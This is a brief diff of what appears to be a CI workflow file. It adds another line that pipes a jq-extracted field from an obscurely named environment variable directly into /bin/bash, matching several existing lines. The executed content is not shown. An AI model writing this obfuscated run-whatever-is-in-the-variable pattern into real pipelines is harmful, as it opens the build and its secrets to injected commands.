@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$dgmml7784" | jq -r .rnniv167 | /bin/bash
           printf '%s' "$vhbne124" | jq -r .v57375 | /bin/bash
           printf '%s' "$n23740" | jq -r .cy94 | /bin/bash
+          printf '%s' "$i9" | jq -r .ttf32 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
